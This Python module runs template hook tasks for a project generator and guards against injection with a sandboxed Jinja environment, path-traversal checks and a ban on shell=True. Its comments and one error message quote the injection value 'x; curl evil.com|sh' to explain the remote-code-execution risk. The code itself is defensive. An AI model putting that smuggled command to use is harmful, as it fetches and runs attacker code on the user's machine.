"""TaskRunner — pre/post 钩子执行.

来源：
- copier/_main.py:383-427 — _execute_tasks() Jinja2 渲染 + shell/list 双模式
- cookiecutter/hooks.py:80-128 — run_script_with_context()
"""

import logging
import os as subprocess_os
import subprocess
from pathlib import Path

import jinja2
from jinja2.sandbox import SandboxedEnvironment

from .config import Task
from .errors import HookExecutionError, TaskExecutionError

_logger = logging.getLogger(__name__)


class TaskRunner:
    """执行钩子任务列表。来源：Copier _execute_tasks 模式。"""

    def __init__(self, project_dir: Path, current_phase: str = ""):
        self.project_dir = project_dir
        self._current_phase = current_phase

    def run(
        self,
        tasks: list[Task],
        context: dict,
        jinja_env: jinja2.Environment | None = None,
    ) -> None:
        if not tasks:
            return
        # A4: TaskRunner 必须用 SandboxedEnvironment — 防止恶意模板
        # 通过 jinja 渲染注入 __import__ / os.system 等构造逃逸。
        if jinja_env is None:
            jinja_env = SandboxedEnvironment()

        for task in tasks:
            # 1. 检查 when 条件
            if isinstance(task.when, str):
                try:
                    tpl = jinja_env.from_string(task.when)
                    should_run = (
                        tpl.render(**context).strip().lower() not in ("false", "no", "0", "")
                    )
                except jinja2.UndefinedError as e:
                    _logger.warning(
                        "task when 条件引用了未定义变量 '%s' (task=%r): %s",
                        task.when,
                        task.cmd,
                        e,
                    )
                    should_run = False
            else:
                should_run = bool(task.when)
            if not should_run:
                continue

            # 2. 渲染 working_directory
            wd = self.project_dir
            if task.working_directory:
                tpl = jinja_env.from_string(task.working_directory)
                wd = wd / tpl.render(**context)
            wd = wd.resolve()
            # 防 working_directory 路径穿越：必须在 project_dir 内
            try:
                wd.relative_to(self.project_dir.resolve())
            except ValueError:
                raise ValueError(
                    f"task working_directory '{wd}' escapes project_dir "
                    f"'{self.project_dir}' (path traversal blocked)"
                )
            wd.mkdir(parents=True, exist_ok=True)

            # 3. extra_vars 双注入（Jinja 渲染层 + 环境变量层）
            extra_context = {f"_{k}": v for k, v in task.extra_vars.items()}
            extra_context["_ae_phase"] = self._current_phase
            extra_env = {k.upper(): str(v) for k, v in task.extra_vars.items()}
            extra_env["AE_PHASE"] = self._current_phase
            render_context = {**context, **extra_context}

            # 4. 渲染命令 — A4: shell=True 禁用（防止 RCE via project_name="x; curl evil.com|sh"）
            if isinstance(task.cmd, list):
                cmd = [jinja_env.from_string(s).render(**render_context) for s in task.cmd]
                use_shell = False  # list 模式始终安全
            else:
                # A4 安全: string cmd + shell=True 显式拒绝 — 防止 RCE
                # 模板作者必须改用 list cmd (argv 数组, 无 shell 解释)
                if task.shell:
                    raise TaskExecutionError(
                        command=task.cmd,
                        returncode=-1,
                        stderr=(
                            "shell=True 已被 A4 安全策略禁用 (RCE 风险: "
                            "project_name='x; curl evil.com|sh' 可执行任意命令)。"
                            "改用 list cmd: cmd=['sh', '-c', '...'] 或 cmd=['bash', '-c', '...']"
                        ),
                    )
                cmd = jinja_env.from_string(task.cmd).render(**render_context)
                use_shell = False

            # 5. 执行
            env = {**subprocess_os.environ, **extra_env}
            result = subprocess.run(
                cmd,
                shell=use_shell,
                cwd=str(wd),
                capture_output=True,
                text=True,
                timeout=300,
                encoding="utf-8",
                errors="replace",
                env=env,
            )
            if result.returncode != 0:
                raise TaskExecutionError(
                    command=str(cmd),
                    returncode=result.returncode,
                    stderr=result.stderr,
                )


# ─── HookSpec — 渲染生命周期钩子规范 ─────────────────────────────────────────


from dataclasses import dataclass


@dataclass
class HookSpec:
    """5 类渲染生命周期钩子规范.

    来源: design/v5.0-Design-Init.md §5.2

    钩子用途:
    - before_renderer: 渲染开始前调用，可用于准备环境、检查前置条件
    - after_renderer:  渲染结束后调用，可用于后处理生成的文件
    - before_copy_file: 复制单个文件前调用
    - after_copy_file:  复制单个文件后调用
    - on_exists:        目标文件已存在时调用

    每个字段为 Jinja2 模板命令列表，渲染时传入 context。
    """

    before_renderer: list[str] | None = None
    after_renderer: list[str] | None = None
    before_copy_file: list[str] | None = None
    after_copy_file: list[str] | None = None
    on_exists: list[str] | None = None


# ─── HookRunner — 渲染生命周期钩子执行器 ───────────────────────────────────────


class HookRunner:
    """执行 5 类渲染生命周期钩子.

    来源: Copier 钩子模式 + Cookiecutter hooks.py

    设计原则:
    - 钩子执行失败 log warning + 继续（不阻断渲染主流程）
    - 每个钩子方法接收 (context, ...) 参数，context 用于 Jinja2 渲染
    - before_renderer_hook(context)
    - after_renderer_hook(context, generated_files)
    - before_copy_file_hook(src, dst, context)
    - after_copy_file_hook(src, dst, context)
    - on_exists_hook(dst_rel_path)
    """

    def __init__(self, project_dir: Path, spec: HookSpec | None = None, strict: bool = True):
        self.project_dir = project_dir
        self.spec = spec or HookSpec()
        self.strict = strict

    def _run_hook_commands(
        self,
        commands: list[str],
        context: dict,
        extra: dict | None = None,
    ) -> None:
        """执行钩子命令列表。strict=True 时失败抛异常，否则 log warning 继续。"""
        if not commands:
            return

        render_context = {**context, **(extra or {})}

        for cmd in commands:
            try:
                env = {**subprocess_os.environ}
                tpl = SandboxedEnvironment().from_string(cmd)
                rendered_cmd = tpl.render(**render_context)
                result = subprocess.run(
                    rendered_cmd,
                    shell=False,
                    cwd=str(self.project_dir),
                    capture_output=True,
                    text=True,
                    timeout=60,
                    encoding="utf-8",
                    errors="replace",
                    env=env,
                )
                if result.returncode != 0 and self.strict:
                    raise HookExecutionError(
                        command=rendered_cmd,
                        exit_code=result.returncode,
                        stderr=result.stderr,
                    )
            except HookExecutionError:
                raise
            except Exception as e:
                if self.strict:
                    raise HookExecutionError(command=cmd, stderr=str(e)) from e
                _logger.warning("hook command failed: %s — %s", cmd, e)

    def before_renderer_hook(self, context: dict) -> None:
        """渲染开始前调用."""
        if self.spec.before_renderer:
            self._run_hook_commands(self.spec.before_renderer, context)

    def after_renderer_hook(self, context: dict, generated_files: list[Path]) -> None:
        """渲染结束后调用，传入生成的文件列表."""
        if self.spec.after_renderer:
            # 将 generated_files 转为字符串列表传给钩子
            extra = {
                "generated_files": " ".join(str(f) for f in generated_files),
                "_generated_files_list": [str(f) for f in generated_files],
            }
            self._run_hook_commands(self.spec.after_renderer, context, extra)

    def before_copy_file_hook(
        self, src: Path, dst: Path, context: dict
    ) -> None:
        """复制单个文件前调用."""
        if self.spec.before_copy_file:
            extra = {
                "src": str(src),
                "dst": str(dst),
                "dst_rel_path": dst.name,
            }
            self._run_hook_commands(self.spec.before_copy_file, context, extra)

    def after_copy_file_hook(
        self, src: Path, dst: Path, context: dict
    ) -> None:
        """复制单个文件后调用."""
        if self.spec.after_copy_file:
            extra = {
                "src": str(src),
                "dst": str(dst),
                "dst_rel_path": dst.name,
            }
            self._run_hook_commands(self.spec.after_copy_file, context, extra)

    def on_exists_hook(self, dst_rel_path: str) -> None:
        """目标文件已存在时调用."""
        if self.spec.on_exists:
            # on_exists 只需要文件路径，不需要完整 context
            extra = {"dst_rel_path": dst_rel_path}
            self._run_hook_commands(self.spec.on_exists, {}, extra)

